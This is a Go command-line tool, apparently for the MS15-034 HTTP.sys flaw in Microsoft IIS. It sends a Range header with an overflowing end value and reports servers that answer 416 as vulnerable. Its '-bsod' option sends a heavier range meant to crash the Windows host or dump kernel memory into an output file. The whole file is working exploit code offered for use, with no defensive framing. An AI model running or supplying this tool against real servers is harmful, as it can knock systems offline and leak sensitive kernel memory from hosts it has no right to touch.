package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"
)

const (
	RANGE_HEADER                 = "Range"
	RANGE_LIGHT_TEST             = "bytes=0-18446744073709551615"
	RANGE_HEAVY_TEST             = "bytes=%d-18446744073709551615"
	STATUS_RANGE_NOT_SATISFIABLE = 416
	STATUS_INVALID_HEADER_NAME   = 400
)

func main() {
	var addr = flag.String("addr", "", "HTTP address from file to request")
	var bsod = flag.Bool("bsod", false, "Defines whether should force BSOD")
	var fout = flag.String("output", "http.out", "Output file to dump HTTP output")
	var noout = flag.Bool("noout", false, "Defines whether should write HTTP output")
	flag.Parse()

	if len(*addr) == 0 {
		flag.Usage()
		return
	}
	if len(*fout) < 3 {
		fmt.Println("Output file name should have at least 3 characters")
		return
	}

	client := &http.Client{
		Timeout: time.Duration(time.Second * 5),
	}
	fileSize := 20

	// Tries to create a request that dumps kernel memory to output
	if *bsod && !*noout {
		fileSize = GetHttpFileSize(client, *addr) - 1
	}

	req, err := http.NewRequest("GET", *addr, nil)
	if err != nil {
		fmt.Println("Request error:", err)
		return
	}
	if *bsod {
		req.Header.Add(RANGE_HEADER, fmt.Sprintf(RANGE_HEAVY_TEST, fileSize))
	} else {
		req.Header.Add(RANGE_HEADER, RANGE_LIGHT_TEST)
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Send request error:", err)
	}
	if resp == nil {
		return
	}
	defer resp.Body.Close()

	server := resp.Header.Get("Server")
	if len(server) > 0 && !strings.Contains(server, "Microsoft") {
		fmt.Println("[?] Not IIS")
	}

	switch resp.StatusCode {
	case STATUS_RANGE_NOT_SATISFIABLE:
		fmt.Println("[!!] Looks vulnerable")
	default:
		fmt.Println("[*] Looks patched or unaffected")
	}

	if *bsod && !*noout {
		fo, err := os.Create(*fout)
		if err != nil {
			fmt.Println("Could not create output file")
		} else {
			defer fo.Close()
			buffer := make([]byte, 20)
			for {
				l, err := resp.Body.Read(buffer)
				if err == nil && l > 0 {
					fo.Write(buffer[:l])
					fo.Sync()
				}
			}
		}
	}
}

func GetHttpFileSize(client *http.Client, addr string) int {
	resp, err := client.Get(addr)
	if err != nil {
		fmt.Println("Could not send request to determine file size:", err)
		return -1
	}
	defer resp.Body.Close()

	buffer, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Could not read requested file:", err)
		return -1
	}

	return len(buffer)
}
